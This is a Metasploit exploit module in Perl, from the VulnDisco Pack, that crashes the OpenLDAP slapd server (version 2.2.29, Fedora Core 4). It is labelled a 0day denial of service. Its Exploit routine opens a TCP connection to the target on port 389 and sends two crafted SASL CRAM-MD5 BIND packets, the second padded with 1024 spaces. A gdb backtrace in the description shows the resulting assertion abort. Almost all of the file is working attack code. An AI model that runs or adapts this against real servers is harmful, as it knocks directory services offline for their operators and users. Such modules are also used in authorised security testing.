# vd_openldap.pm
#
# The exploit is a part of VulnDisco Pack - use only under the license agreement
# specified in LICENSE.txt in your VulnDisco distribution

use strict;

package Msf::Exploit::vd_openldap;
use base "Msf::Exploit";
use Pex::Text;

my $advanced = { };

my $info = 
{
	"Name"      => "[0day] OpenLDAP DoS",
    	"Version"   => "\$Revision: 1.0 \$",
    	"Authors"   => ["Evgeny Legerov"],
    	"Arch"      => ["x86"],
    	"OS"        => ["linux"],
    	"Priv"      => 1,
    	"UserOpts"  =>
                {
                	"RHOST" => [1, "ADDR", "The target address"],
                    	"RPORT" => [1, "PORT", "The target port", 389]
                },

    	"Description" => Pex::Text::Freeform(q{
This is a Denial of Service exploit.
Debug session:
Program received signal SIGABRT, Aborted.
[Switching to Thread -1375056976 (LWP 13500)]
0xaeb747e2 in _dl_sysinfo_int80 () from /lib/ld-linux.so.2
(gdb) bt
#0  0xaeb747e2 in _dl_sysinfo_int80 () from /lib/ld-linux.so.2
#1  0xae7c71f8 in raise () from /lib/libc.so.6
#2  0xae7c8948 in abort () from /lib/libc.so.6
#3  0xae7c038e in __assert_fail () from /lib/libc.so.6
#4  0x125d09b1 in ldap_dn2bv_x () from /usr/sbin/slapd
#5  0x12539596 in slap_sasl_getdn () from /usr/sbin/slapd
#6  0x12539c95 in slap_sasl_getdn () from /usr/sbin/slapd
#7  0xaea88987 in _sasl_canon_user () from /usr/lib/libsasl2.so.2
#8  0xae5da94d in crammd5_client_plug_init () from /usr/lib/sasl2/libcrammd5.so.2
#9  0xaea9183b in sasl_server_step () from /usr/lib/libsasl2.so.2
#10 0x12538785 in slap_sasl_bind () from /usr/sbin/slapd
#11 0x12516ecf in do_bind () from /usr/sbin/slapd
#12 0x124feac0 in connection_read () from /usr/sbin/slapd
#13 0x125bfa24 in ldap_int_thread_pool_shutdown () from /usr/sbin/slapd
#14 0xae8dab80 in start_thread () from /lib/libpthread.so.0
#15 0xae869dee in clone () from /lib/libc.so.6

		}),

  	"DefaultTarget"  => 0,
        "Targets"        =>
                [
                        ["openldap-2.2.29-1.FC4.i386.rpm / Fedora Core 4"],
                ],

        "Keys"           => ["vd_openldap"],
};

sub new	{
	my $class = shift;
	return $class->SUPER::new({"Info" => $info, "Advanced" => $advanced}, @_);
}

sub Exploit {
	my $self = shift;
        my $host = $self->GetVar("RHOST");
        my $port = $self->GetVar("RPORT");

      	my $sock = Msf::Socket::Tcp->new("PeerAddr" => $host, "PeerPort"  => $port);
        if ($sock->IsError) {
                $self->PrintLine("Error creating socket: " . $sock->GetError);
                return;
        }

	$self->PrintLine("Sending LDAP BIND request...");

	my $s="\x30\x17\x02\x02\x04\xe7\x60\x11\x02\x01\x03\x04\x00\xa3\x0a\x04";
 	$s .= "\x08\x43\x52\x41\x4d\x2d\x4d\x44\x35";
      	$sock->Send($s);
	$sock->Recv(-1, 10);


	$s  = "\x30\x82\x04\x1f\x02\x02\x04\xe6\x60\x82\x04\x17\x02\x01\x03\x04";
        $s .= "\x00\xa3\x82\x04\x0e\x04\x08\x43\x52\x41\x4d\x2d\x4d\x44\x35\x04";
        $s .= "\x82\x04\x00";
	$s .= "\x20" x 1024;

	$self->PrintLine("Sending second LDAP BIND request...");

	$sock->Send($s);
	$sock->Close();

	$self->PrintLine("Done");
}

__END__
